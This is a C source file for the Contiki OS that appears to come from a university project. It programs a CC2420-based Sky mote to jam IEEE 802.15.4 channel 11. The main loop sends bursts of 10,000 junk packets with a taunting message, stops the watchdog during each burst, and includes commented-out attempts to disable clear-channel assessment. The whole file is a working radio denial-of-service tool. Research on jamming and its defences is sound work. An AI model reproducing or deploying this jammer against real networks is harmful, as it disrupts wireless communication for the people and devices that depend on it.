
/**
 * \file
 *         Program for jamming a specific channel
 * \author
 *         Malthe Tøttrup <201907882@post.au.dk>
 * 
 *         $ make TARGET=sky distclean 
 *         $ make TARGET=sky MOTES=/dev/ttyUSB0 energy_test.upload login
 */

#include "contiki.h"
#include <stdio.h> /* For printf() */
#include <math.h>
#include <os/dev/radio.h>  
#include "net/nullnet/nullnet.h"
#include "net/netstack.h"
#include <stdbool.h>
#include <string.h>
#include "sys/log.h"
#include "cc2420.h"
#include "dev/watchdog.h"
#include "sys/energest.h"

#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO
#define CLOCK_MS CLOCK_SECOND/1000
#define SEND_INTERVAL (2 * CLOCK_MS) //2 ms
#define JAMMER_PACKET_LEN 120


static int current_channel = 11;

typedef struct{
     char data[JAMMER_PACKET_LEN];
}jpacket_t;

/*---------------------------------------------------------------------------*/
PROCESS(jammer, "jammer process");
AUTOSTART_PROCESSES(&jammer);
/*---------------------------------------------------------------------------*/

PROCESS_THREAD(jammer, ev, data)
{   
    PROCESS_BEGIN();
    printf("Starting jamming attack %d \n", (11 << 1));
    
    // NETSTACK_RADIO.on();

    //Hopefully this turns CCA off...
    // NETSTACK_RADIO.set_value(RADIO_PARAM_TX_MODE, 0);   //turning CCA off (https://sourceforge.net/p/contiki/mailman/message/34745886/)
    
    
    cc2420_set_channel(current_channel);
    jpacket_t jpacket;
    memset(&jpacket, 0, sizeof(jpacket_t));
    static struct etimer et;
    etimer_set(&et, CLOCK_SECOND);
    strcpy(jpacket.data, "Antonio Gonga is taking down your network.");

    
    
    while(1){
        PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));
        watchdog_stop();
        NETSTACK_RADIO.on();
        for(int i = 0; i< 10000; i++) {
            
            cc2420_driver.send((void*)&jpacket, JAMMER_PACKET_LEN);
            
        }
        NETSTACK_RADIO.off();
        watchdog_start();
        etimer_reset(&et);
    }

    PROCESS_END();
}
/*---------------------------------------------------------------------------*/
